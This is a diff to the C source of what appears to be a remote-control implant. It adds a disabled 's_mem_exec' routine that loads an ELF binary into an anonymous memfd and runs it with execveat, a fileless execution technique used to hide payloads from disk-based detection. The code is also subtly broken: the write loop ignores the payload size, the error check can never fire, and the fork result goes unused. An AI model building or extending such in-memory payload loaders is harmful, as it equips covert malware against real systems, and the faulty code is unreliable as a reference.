@@ -169,6 +169,70 @@ PPACKER checkin_command(uint8_t *args){
     checkin();
     return NULL;
 }
+
+#ifdef NOTIMPLEMENTED
+int str_to_argv(char *str, char **argv){
+    if(!str || !argv) return -1;
+
+    int argc = 0;
+    char *start = str;
+    char *end = str;
+
+    while (*end != '\0') {
+        if (*end == ' ') {
+            *end = '\0';
+            argv[argc] = start;
+            argc++;
+            start = end + 1;
+        }
+        end++;
+    }
+
+    argv[argc] = start;
+    argc++;
+    argv[argc] = NULL;
+
+    return argc;
+}
+
+
+char *s_mem_exec(char *arg, uint8_t *elf_code, uint64_t size){
+
+    pid_t pid = s_fork();
+    
+    const char *envp[] = {
+        "PATH=/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin:/bin",
+        NULL
+    };
+
+    int fd = s_memfd_create("",0);
+    size_t res = 0;
+    size_t current = 0;
+
+    if(fd < 0){
+        MSG("Error in memfd_create");
+        return NULL;
+    }
+
+    while((res = s_write(fd,  elf_code + current, BUFSIZ)) > 0)
+        current += res;
+    
+
+    if(res < 0){
+        MSG("Error on write");
+        s_close(fd);
+        return NULL;
+    }
+
+    char *args[20] = {};
+    int argc = str_to_argv(arg, args);
+    if(argc < 0) return NULL;
+
+    s_execveat(fd, "", (const char **)args, envp, 0x1000);
+    return NULL;
+}
+#endif
+
 char *s_exec(char *cmd, size_t *size) {
     if(!cmd) {MSG("no commands passed in parameter"); return NULL;}
     FILE *f = NULL;
